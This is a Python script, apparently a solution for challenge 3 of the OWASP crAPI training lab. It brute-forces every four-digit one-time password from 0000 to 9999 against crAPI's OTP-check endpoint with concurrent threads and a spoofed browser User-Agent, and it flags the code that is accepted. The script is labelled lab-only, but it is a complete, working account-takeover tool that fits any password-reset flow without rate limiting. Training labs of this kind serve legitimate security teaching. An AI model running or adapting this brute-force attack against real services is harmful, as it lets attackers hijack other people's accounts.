#!/usr/bin/env python3

"""
crAPI Challenge 3 - OTP Verification Testing Utility

Purpose:
Demonstrates the impact of missing rate limiting during OTP verification.

Environment:
OWASP crAPI local lab only

Author: MuizRecon
"""

import requests
import time
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed


# ================= ARGUMENTS =================

def parse_arguments():

    parser = argparse.ArgumentParser(
        description="OTP verification testing utility for OWASP crAPI lab"
    )

    parser.add_argument(
        "--url",
        required=True,
        help="Target crAPI base URL"
    )

    parser.add_argument(
        "--email",
        required=True,
        help="Lab account email"
    )

    parser.add_argument(
        "--threads",
        type=int,
        default=10,
        help="Number of concurrent workers"
    )

    return parser.parse_args()


# ================= CONFIG =================

args = parse_arguments()

BASE_URL = args.url.rstrip("/")
EMAIL = args.email
THREADS = args.threads


OTP_ENDPOINT = (
    f"{BASE_URL}/identity/api/auth/v2/check-otp"
)


HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}


# ================= OTP TEST =================

def test_otp(otp):

    payload = {
        "email": EMAIL,
        "otp": otp
    }

    try:

        response = requests.post(
            OTP_ENDPOINT,
            json=payload,
            headers=HEADERS,
            timeout=5
        )


        if response.status_code != 200:
            return None


        body = response.text.lower()


        success_indicators = [
            "success",
            "verified",
            "valid",
            "reset"
        ]


        for indicator in success_indicators:

            if indicator in body:

                return {
                    "otp": otp,
                    "status": response.status_code,
                    "response": response.text
                }


        return None


    except requests.RequestException:

        return None



# ================= TESTING LOGIC =================

def run_test():

    print("=" * 60)
    print("crAPI OTP Verification Testing Utility")
    print("=" * 60)

    print(f"[+] Target: {OTP_ENDPOINT}")
    print(f"[+] Account: {EMAIL}")
    print(f"[+] Workers: {THREADS}")
    print("[+] OTP Range: 0000-9999")
    print()


    start_time = time.time()

    tested = 0
    result_found = None


    with ThreadPoolExecutor(
        max_workers=THREADS
    ) as executor:


        tasks = []


        for number in range(10000):

            otp = f"{number:04d}"

            tasks.append(
                executor.submit(
                    test_otp,
                    otp
                )
            )


        for future in as_completed(tasks):

            tested += 1

            result = future.result()


            if tested % 100 == 0:

                elapsed = time.time() - start_time

                print(
                    f"[*] Tested {tested}/10000 "
                    f"in {elapsed:.2f}s"
                )


            if result:

                result_found = result

                break



    if result_found:

        print()
        print("=" * 60)
        print("[+] VALID OTP IDENTIFIED")
        print("=" * 60)

        print(
            f"OTP: {result_found['otp']}"
        )

        print(
            f"HTTP Status: {result_found['status']}"
        )


    else:

        print()
        print("[-] No valid OTP detected")



# ================= MAIN =================

if __name__ == "__main__":

    run_test()
